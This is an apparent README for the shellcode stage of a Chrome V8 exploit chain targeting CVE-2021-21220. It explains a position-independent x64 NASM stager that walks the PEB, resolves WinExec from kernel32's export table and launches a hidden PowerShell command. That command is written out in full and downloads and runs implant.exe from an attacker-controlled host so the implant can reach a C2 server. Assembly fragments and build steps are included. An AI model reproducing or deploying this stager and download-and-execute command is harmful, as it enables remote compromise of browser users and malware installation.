# Shellcode Generation — Flat x64 NASM Stager

Generates position-independent x64 shellcode that runs directly on the RWX WebAssembly page created by the Chrome V8 exploit. No `VirtualAlloc`, no PE loader, no external tools required at runtime.

## Overview

The exploit delivers shellcode to a WebAssembly RWX page via the CVE-2021-21220 V8 type confusion primitive. That shellcode must run entirely in-place inside the sandboxed Chrome renderer — it cannot allocate new executable memory.

The stager solves this by doing the minimum work inside the sandbox:

1. Walk the PEB to find `kernel32.dll` base address
2. Parse the PE export table to resolve `WinExec`
3. Call `WinExec` with an embedded PowerShell command

PowerShell (an unsandboxed process) then downloads and runs `implant.exe` from the file server.

```
stager.asm  →  WinExec(powershell ...)
                   ↓
           powershell downloads implant.exe
                   ↓
           implant.exe connects to C2
```

## File Structure

```
shellcode-generation/
├── src/
│   └── stager.asm          # Flat x64 NASM shellcode (active payload)
├── bin/
│   ├── stager_patched.asm  # Intermediate: HOST_IP substituted (generated)
│   └── final_shellcode.bin # Final shellcode binary (generated)
├── Makefile
└── README.md
```

## Usage

Built automatically by `launch.sh` — you do not need to run this manually.

```bash
# Manual build (HOST_IP is baked into the PowerShell command)
make HOST_IP=192.168.56.1

# Clean generated files
make clean
```

Output: `bin/final_shellcode.bin` (~300 bytes)

## How It Works

### PEB Walking (kernel32 resolution)

The shellcode locates `kernel32.dll` without any imports by traversing the Process Environment Block:

```
GS:[0x60]         → PEB
PEB  + 0x18       → PEB.Ldr
Ldr  + 0x20       → InMemoryOrderModuleList.Flink  (exe entry)
[Flink]           → ntdll entry
[[Flink]]         → kernel32 entry
entry + 0x20      → DllBase
```

### Export Table Parsing (WinExec resolution)

```
rbx + [rbx+0x3C]  → NT headers
NtHdr + 0x88      → ExportDirectory RVA
ExportDir + 0x18  → NumberOfNames
ExportDir + 0x20  → AddressOfNames RVA
ExportDir + 0x24  → AddressOfNameOrdinals RVA
ExportDir + 0x1C  → AddressOfFunctions RVA
```

The stager iterates `AddressOfNames` comparing each name against the little-endian qword `0x00636578456E6957` (`"WinExec\0"`) to find the target function.

### jmp/call/pop (string address)

Getting the address of the embedded command string without RIP-relative addressing:

```nasm
jmp  .getstr
.exec:
    pop  rcx        ; RCX = &cmd  (return address pushed by call below)
    xor  rdx, rdx   ; SW_HIDE = 0
    call r12        ; WinExec(cmd, 0)
.getstr:
    call .exec      ; pushes &cmd, jumps to .exec
cmd:
    db 'powershell ...', 0x00
```

### Stack Alignment

The Chrome V8 JIT entry point does not guarantee 16-byte stack alignment. The stager enforces it:

```nasm
and  rsp, 0xFFFFFFFFFFFFFFF0
sub  rsp, 0x20      ; 32-byte shadow space; RSP is 16-aligned at WinExec call
```

Windows x64 ABI requires RSP to be 16-byte aligned at every `call` site. `WinExec` uses SSE instructions internally and will fault on a misaligned stack.

### PowerShell Command

The embedded command (with HOST_IP substituted by the Makefile):

```
powershell -w h -nop -c "(New-Object Net.WebClient).DownloadFile('http://<HOST_IP>:8000/implant.exe','C:\Users\Public\i.exe');Start-Process 'C:\Users\Public\i.exe'"
```

- `-w h` — hidden window
- `-nop` — no profile (faster startup)
- Downloads `implant.exe` from the file server to `C:\Users\Public\i.exe`
- Executes it immediately

## Why Not Donut?

Donut wraps PE files into shellcode, but its bootstrap loader calls `VirtualAlloc(PAGE_EXECUTE_READWRITE)` to unpack the PE at runtime. Chrome's renderer sandbox blocks all `VirtualAlloc` calls with executable permission flags — the allocation returns `NULL` and Donut faults immediately with `STATUS_ACCESS_VIOLATION`.

This applies to both a Donut-wrapped payload and a Donut-wrapped injector — Donut itself needs executable memory before it can inject into anything else. Flat position-independent shellcode (this stager) sidesteps the problem entirely by running in-place on the RWX page the exploit already owns.

## Build Dependencies

- `nasm` — assembler (`sudo apt install nasm`)
- No cross-compiler required (pure shellcode, no C)
